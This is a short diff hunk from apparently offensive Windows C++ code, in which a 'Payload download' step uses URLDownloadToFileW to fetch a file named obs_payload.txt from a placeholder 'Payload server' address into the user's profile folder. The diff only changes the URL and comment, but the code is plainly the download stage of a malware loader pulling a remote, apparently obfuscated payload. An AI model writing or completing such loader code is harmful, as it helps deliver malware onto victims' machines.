@@ -36,7 +36,7 @@ int main(int argc, char* argv[]) {
         LPCWSTR LpcUserProfile = wUserProfile.c_str();
 
         //Payload download
-        LPCWSTR url = L"http://ip:8000/base64.txt";//python server.
+        LPCWSTR url = L"http://<ip>:<port>/obs_payload.txt";//Payload server.
         LPCWSTR destination = LpcUserProfile;
         HRESULT hr = URLDownloadToFileW(NULL, url, destination, 0, NULL);
 
